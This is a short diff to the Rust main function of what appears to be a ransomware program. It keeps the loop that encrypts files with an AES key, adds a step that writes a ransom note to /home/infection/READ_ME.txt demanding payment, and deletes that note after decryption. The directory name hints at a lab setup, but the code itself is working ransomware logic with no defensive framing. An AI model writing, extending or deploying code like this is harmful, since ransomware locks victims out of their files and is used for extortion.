@@ -1,4 +1,7 @@
-use std::{fs::File, io::Write};
+use std::{
+    fs::{self, File},
+    io::Write,
+};
 
 use rsa::pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey};
 
@@ -28,12 +31,16 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         for file in &files {
             encrypt::encrypt_file(file, &aes_key).unwrap();
         }
+
+        let mut ransom_note = File::create("/home/infection/READ_ME.txt")?;
+        ransom_note.write_all(b"Your files have been encrypted. Pay ransom to get the key.")?;
     } else {
         let encrypted_files = get_files::get_infected_files("/home/infection");
         let decrypted_aes_key = decrypt::decrypt_aes_key()?;
         for file in &encrypted_files {
             decrypt::decrypt_file(file, &decrypted_aes_key).unwrap();
         }
+        fs::remove_file("/home/infection/READ_ME.txt")?;
     }
 
     Ok(())
